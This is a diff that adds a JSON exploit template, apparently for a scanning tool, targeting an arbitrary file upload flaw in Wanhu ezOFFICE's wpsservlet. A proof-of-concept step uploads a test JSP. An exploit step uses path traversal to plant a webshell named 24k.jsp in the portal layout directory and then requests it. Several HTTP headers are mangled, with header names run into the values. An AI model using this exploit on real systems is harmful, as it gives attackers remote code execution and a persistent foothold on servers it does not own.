@@ -1,0 +1,44 @@
+{
+	"name":"万户ezofficewpsservlet任意文件上传",
+	"tag":"wanhu",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/defaultroot/wpsservlet?option=saveNewFile&newdocId=apoxkq&dir=../platform/portal/layout/&fileType=.jsp",
+		"pocPost":"--ufuadpxathqvxfqnuyuqaozvseiueerp\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"apoxkq.jsp\"\r\n\r\n<% out.print(\"sasdfghjkj\");%>\r\n--ufuadpxathqvxfqnuyuqaozvseiueerp--",
+		"header":{
+			"Upgrade-Insecure-Requests":" 1",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; WOW64; rv",
+			"Accept-Encoding":" gzip, deflate",
+			"Accept-Language":" zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Connection",
+			"Content-Length":" 173Accept",
+			"Content-Type":" multipart/form-data; boundary=ufuadpxathqvxfqnuyuqaozvseiueerpDNT"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/defaultroot/wpsservlet?option=saveNewFile&newdocId=apoxkq&dir=../platform/portal/layout/&fileType=.jsp",
+			"expPost":"--ufuadpxathqvxfqnuyuqaozvseiueerp\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"24k.jsp\"\r\n\r\n{{webshell}}\r\n--ufuadpxathqvxfqnuyuqaozvseiueerp--",
+			"header":{
+				"Upgrade-Insecure-Requests":" 1",
+				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; WOW64; rv",
+				"Accept-Encoding":" gzip, deflate",
+				"Accept-Language":" zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Connection",
+				"Content-Length":" 173Accept",
+				"Content-Type":" multipart/form-data; boundary=ufuadpxathqvxfqnuyuqaozvseiueerpDNT"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		},
+		"step2":{
+			"expGet":"/defaultroot/platform/portal/layout/24k.jsp",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
